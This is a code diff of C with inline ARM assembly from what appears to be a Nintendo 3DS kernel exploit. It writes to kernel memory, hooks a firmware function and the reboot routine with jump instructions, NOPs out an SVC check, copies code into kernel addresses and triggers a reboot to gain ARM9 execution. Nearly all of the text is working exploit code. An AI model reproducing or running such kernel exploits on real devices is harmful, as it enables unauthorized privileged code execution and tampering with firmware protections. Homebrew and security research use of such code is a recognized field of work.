@@ -5,7 +5,6 @@
 #include <malloc.h>
 #include <dirent.h>
 
-
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 unsigned int patch_addr;
 unsigned int svc_patch_addr;
@@ -14,7 +13,6 @@ unsigned int kversion;
 u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
-
 
 //Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
@@ -35,6 +33,34 @@ void invalidateDataCache(void) {
         "mcr p15,0,%0,c7,c10,4\t\n"
         :: "r" (0)
     );
+}
+
+void sub_20CC(void){
+	__asm__ ("LDR R1, =0xFFFCC48C\t\n"
+	  		  "1:\t\n"
+	           "LDRH R2, [R1,#4]\t\n"
+	           "TST R2, #2\t\n"
+	           "BNE 1b\t\n"
+	           "STR R0, [R1,#8]\t\n"
+	           "BX LR");
+}
+
+void sub_20E4(void){
+	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
+	  		   "LDRB R1, [R0,#3]\t\n"
+	           "ORR R1, R1, #0x40\t\n"
+	           "STRB R1, [R0,#3]\t\n"
+	           "BX LR");
+}
+
+void sub_20F8(void){
+	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
+	  		  "2:\t\n"
+	           "LDRH R1, [R0,#4]\t\n"
+	           "TST R1, #0x100\t\n"
+	           "BNE 2b\t\n"
+	           "LDR R0, [R0,#0xC]\t\n"
+	           "BX LR");
 }
 
 int do_gshax_copy(void *dst, void *src, unsigned int len)
@@ -232,134 +258,49 @@ arm11_kernel_execute(int (*func)(void))
 			 "bx lr\t\n");
 }
 
-//arm11 kernel entry point
-void test(void)
-{
-	arm11_buffer[0] = 0xFAAFFAAF;
-	arm9_kernel_exploit_setup();
-}
-
 // not called directly, offset determines jump
 void jump_table(void)
 {
-#ifdef DEBUG_PROCESS
-printf("Jumping\n");
-#endif
-  func_patch_hook();
-  reboot_func();
+ 	func_patch_hook();
+ 	reboot_func();
 }
 
-
-ARM9_PAYLOAD(void)
+void test(void)
 {
-
-}
-
-arm9_kernel_exploit_setup(void)
-{
-
-#ifdef DEBUG_PROCESS
-	printf("Setting up ARM9 Kernel Exploit\n");
-#endif
-
-	int FUNC_LEN =0x1B60;
-	int ARM9_PAYLOAD_LEN;
 	int (*reboot)(int, int, int, int) = 0xFFF748C4;
-	 __asm__ volatile(
-        "clrex"
-    );
+	__asm__ ("clrex");
 
+	*(int *)0xDFF8383F = 0x8DD00CE5;
 	invalidateDataCache();
 	invalidateInstructionCache();
-
 
 	// ARM9 code copied to FCRAM 0x23F00000
 	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
 	// write function hook at 0xFFFF0C80
-	memcpy(0xEFFF4C80, jump_table, FUNC_LEN);
+	memcpy(0xEFFF4C80, 0x9D2580, 0x9D23AC);
 
 	// write FW specific offsets to copied code buffer
 	*(int *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
 	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
 	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
 
-	__asm__ ("LDR R0, [R0]\t\n"
-  		   "LDR R1, =0xE51FF004\t\n"
-           "STR R1, [R0]\t\n"
-           "LDR R1, =0x8F028C4\t\n"
-           "LDR R1, [R1]\t\n"
-           "STR R1, [R0,#4]");
-
 	// patch function 0xFFF84D90 to jump to our hook
 	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
 	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
-
-	
-
-	__asm__ ("LDR R0, [R0]\t\n"
-  		   "LDR R1, =0xE51FF004\t\n"
-           "STR R1, [R0]\t\n"
-           "LDR R1, =0x8F028C4\t\n"
-           "LDR R1, [R1]\t\n"
-           "STR R1, [R0,#4]");
+	// patch reboot start function to jump to our hook
+	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4
 
 	invalidateDataCache();
 
-	__asm__ ("MOV R0, #0\t\n"
-  		   "MOV R1, #0\t\n"
-           "MOV R2, #2\t\n"
-           "MOV R3, #0\t\n"
-           "LDR LR, =0x8F028BC\t\n"
-           "LDR LR, [LR]\t\n"
-           "BX LR");
-	
-	//reboot(0, 0, 2, 0); // trigger reboot
-}
+	reboot(0, 0, 2, 0); // trigger reboot
 
-int __attribute__((naked))
-arm11_kernel_stub (void)
-{
-	__asm__ ("add sp, sp, #8\t\n");
-
-	arm11_kernel_exec ();
-
-	__asm__ ("movs r0, #0\t\n"
-			 "ldr pc, [sp], #4\t\n");
-}
-
-void sub_20CC(void){
-	__asm__ ("LDR R1, =0xFFFCC48C\t\n"
-	  		  "1:\t\n"
-	           "LDRH R2, [R1,#4]\t\n"
-	           "TST R2, #2\t\n"
-	           "BNE 1b\t\n"
-	           "STR R0, [R1,#8]\t\n"
-	           "BX LR");
-}
-
-void sub_20E4(void){
-	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
-	  		   "LDRB R1, [R0,#3]\t\n"
-	           "ORR R1, R1, #0x40\t\n"
-	           "STRB R1, [R0,#3]\t\n"
-	           "BX LR");
-}
-
-void sub_20F8(void){
-	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
-	  		  "2:\t\n"
-	           "LDRH R1, [R0,#4]\t\n"
-	           "TST R1, #0x100\t\n"
-	           "BNE 2b\t\n"
-	           "LDR R0, [R0,#0xC]\t\n"
-	           "BX LR");
 }
 
 void func_patch_hook(void)
 {
-#ifdef DEBUG_PROCESS
-printf("Patching function\n");
-#endif
+	printf("Patching function\n");
+
   // data written from entry
  	int pdn_regs;
   	int pxi_regs;
@@ -394,9 +335,8 @@ printf("Patching function\n");
 // this is a patched version of function 0xFFFF097C
 void reboot_func(void)
 {
-#ifdef DEBUG_PROCESS
-printf("Rebooting\n");
-#endif
+	printf("Rebooting\n");
+
 	__asm__ ("ADR R0, 15f\t\n"
           "ADR R1, 12f\t\n"
           "LDR R2, =0x1FFFFC00\t\n"
@@ -481,10 +421,21 @@ arm11_kernel_exec (void)
 		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
 		patched_svc = 1;
 	}
-	invalidateDataCache();
-	invalidateInstructionCache();
+	InvalidateEntireInstructionCache();
+	InvalidateEntireDataCache();
 
 	return 0;
+}
+
+int __attribute__((naked))
+arm11_kernel_stub (void)
+{
+	__asm__ ("add sp, sp, #8\t\n");
+
+	arm11_kernel_exec ();
+
+	__asm__ ("movs r0, #0\t\n"
+			 "ldr pc, [sp], #4\t\n");
 }
 
 int doARM11Hax()
@@ -538,17 +489,7 @@ int doARM11Hax()
 			arm11_kernel_execute (test);
 		}
 
-#ifdef DEBUG_PROCESS
-		printf("ARM11 Kernel Code Executed\n");
-#endif
-
 	}
-#ifdef DEBUG_PROCESS
-	else
-	{
-		printf("Kernel exploit set up failed!\n");
-	}
-#endif
 
 	return 0;
 }
